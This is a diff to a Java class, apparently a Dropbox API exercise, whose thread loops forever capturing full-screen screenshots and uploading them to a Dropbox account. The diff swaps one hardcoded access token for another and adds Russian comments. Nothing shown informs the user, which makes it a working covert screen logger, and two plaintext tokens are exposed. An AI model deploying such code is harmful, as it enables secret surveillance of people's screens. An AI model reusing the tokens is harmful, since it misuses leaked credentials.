@@ -13,7 +13,7 @@ public class MyThread extends Thread {
 
     @Override
     public void run() {
-        String ACCESS_TOKEN = "utrma0t93WAAAAAAAAAADOGvTWZfQgx4a5L4IrCXAM6PnTanVMpzsEcWcVmErbgH";
+        String ACCESS_TOKEN = "hlpBmfqwZywAAAAAAAAAATpy8Iy-jUtKb94AcKbzSRiS4KzJ6oLxIWVaz4dx7BCD";
         DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/java-tutorial").build();
         DbxClientV2 client = new DbxClientV2(config, ACCESS_TOKEN);
 
@@ -21,19 +21,23 @@ public class MyThread extends Thread {
         for (;;) {
             System.out.println(threadNumber);
             try {
+                //получение разрешения экрана и создание скриншота
                 Robot robot = new Robot();
                 Rectangle screenSize = new Rectangle(Toolkit.getDefaultToolkit ().getScreenSize ());
                 BufferedImage screenshot = robot.createScreenCapture(screenSize);
 
                 ByteArrayOutputStream on = new ByteArrayOutputStream();
 
+                //приоводим скриншот к формату PNG
                 ImageIO.write(screenshot, "png", on);
                 byte[] bytes = on.toByteArray();
                 InputStream in = new ByteArrayInputStream(bytes);
 
+                //получаем настоящие дату и время
                 SimpleDateFormat formatDate = new SimpleDateFormat("yMMdd_HHmmss");
                 Date date = new Date();
 
+                //загружаем файл на дропбокс с названием в виде даты и расширением .png
                 client.files().uploadBuilder("/" + formatDate.format(date) + ".png")
                         .uploadAndFinish(in);
 
